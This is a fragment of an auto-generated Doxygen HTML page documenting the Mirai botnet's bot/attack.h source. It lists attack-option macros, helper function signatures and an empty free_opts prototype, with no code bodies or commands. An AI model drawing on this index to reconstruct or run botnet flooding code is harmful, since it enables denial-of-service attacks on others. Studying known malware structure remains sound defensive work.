<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="table_8c_html_aa5a64b3cddd9889fca3114b5a87c402e"><div class="ttname"><a href="table_8c.html#aa5a64b3cddd9889fca3114b5a87c402e">table_unlock_val</a></div><div class="ttdeci">void table_unlock_val(uint8_t id)</div><div class="ttdef"><b>Definition:</b> <a href="table_8c_source.html#l00078">table.c:78</a></div></div>
<div class="ttc" id="table_8h_html_a2b2b737a21de0ee9d38eda3b2771d355"><div class="ttname"><a href="table_8h.html#a2b2b737a21de0ee9d38eda3b2771d355">TABLE_ATK_VSE</a></div><div class="ttdeci">#define TABLE_ATK_VSE</div><div class="ttdef"><b>Definition:</b> <a href="table_8h_source.html#l00049">table.h:49</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
</div><!-- fragment -->
</div>
</div>
<a class="anchor" id="aa6ce0f2afc8608824628d8881147f8f9"></a>
<div class="memitem">
<div class="memproto">
<table class="mlabels">
  <tr>
  <td class="mlabels-left">
      <table class="memname">
        <tr>
          <td class="memname">static void free_opts </td>
          <td>(</td>
          <td class="paramtype">struct <a class="el" href="structattack__option.html">attack_option</a> *&#160;</td>
          <td class="paramname">, </td>
        </tr>
        <tr>
          <td class="paramkey"></td>
          <td></td>
          <td class="paramtype">int&#160;</td>
          <td class="paramname">&#160;</td>
        </tr>
        <tr>
          <td></td>
          <td>)</td>
          <td></td><td></td>
        </tr>
      </table>
  </td>
  <td class="mlabels-right">
<span class="mlabels"><span class="mlabel">static</span></span>  </td>
  </tr>
</table>
</div><div class="memdoc">

</div>
</div>
<h2 class="groupheader">Variable Documentation</h2>
<a class="anchor" id="a2ef6e6642ad56d17bf71d5579da924d9"></a>
<div class="memitem">
<div class="memproto">
      <table class="memname">
        <tr>
          <td class="memname">struct <a class="el" href="structattack__target.html">attack_target</a>  __attribute__</td>
        </tr>
      </table>
</div><div class="memdoc">

</div>
</div>
</div><!-- contents -->
</div><!-- doc-content -->
<!-- start footer part -->
<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
  <ul>
    <li class="navelem"><a class="el" href="dir_526aa88726c618d995900bd3fb6ff493.html">mirai</a></li><li class="navelem"><a class="el" href="dir_fc79afbdad77ef6ec155f6566a92d41a.html">bot</a></li><li class="navelem"><a class="el" href="attack_8h.html">attack.h</a></li>
    <li class="footer">Generated by
    <a href="http://www.doxygen.org/index.html">
    <img class="footer" src="doxygen.png" alt="doxygen"/></a> 1.8.11 </li>
  </ul>
</div>
</body>
</html>
